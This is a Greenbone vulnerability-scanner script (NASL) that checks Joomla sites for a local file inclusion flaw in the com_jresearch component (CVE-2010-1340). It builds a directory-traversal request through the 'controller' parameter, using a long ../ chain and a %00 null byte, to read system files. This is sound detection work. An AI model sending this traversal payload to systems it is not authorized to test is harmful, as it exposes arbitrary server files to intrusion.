# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902386");
  script_version("2025-04-15T05:54:49+0000");
  script_cve_id("CVE-2010-1340");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2011-06-24 16:31:03 +0200 (Fri, 24 Jun 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Joomla Component 'com_jresearch' Local File Inclusion Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/installed");

  script_xref(name:"URL", value:"http://www.1337day.com/exploits/16376");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/38917");
  script_xref(name:"URL", value:"http://www.exploit-id.com/web-applications/joomla-component-com_jresearch-local-file-inclusion");

  script_tag(name:"impact", value:"Successful exploitation could allow attackers to perform directory
  traversal attacks and read arbitrary files on the affected application.");

  script_tag(name:"affected", value:"Joomla jresearch component Version 1.2.2, Other versions may also
  be affected.");

  script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied input via
  the 'controller' parameter in 'index.php', which allows attackers to read arbitrary files via a ../(dot dot) sequences.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"Joomla is prone to local file inclusion vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

CPE = "cpe:/a:joomla:joomla";

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("host_details.inc");
include("os_func.inc");
include("http_keepalive.inc");

if(!joomlaPort = get_app_port(cpe:CPE)) exit(0);
if(!joomlaDir = get_app_location(port:joomlaPort, cpe:CPE)) exit(0);

if(joomlaDir == "/") joomlaDir = "";

files = traversal_files();
foreach file (keys(files)){

  url = string(joomlaDir, "/index.php?option=com_jresearch&controller=../../../../../../../../../../../../../..", files[file], "%00");

  if(http_vuln_check(port:joomlaPort, url:url, pattern:file)){
    report = http_report_vuln_url(port:joomlaPort, url:url);
    security_message(port:joomlaPort, data:report);
    exit(0);
  }
}

exit(99);
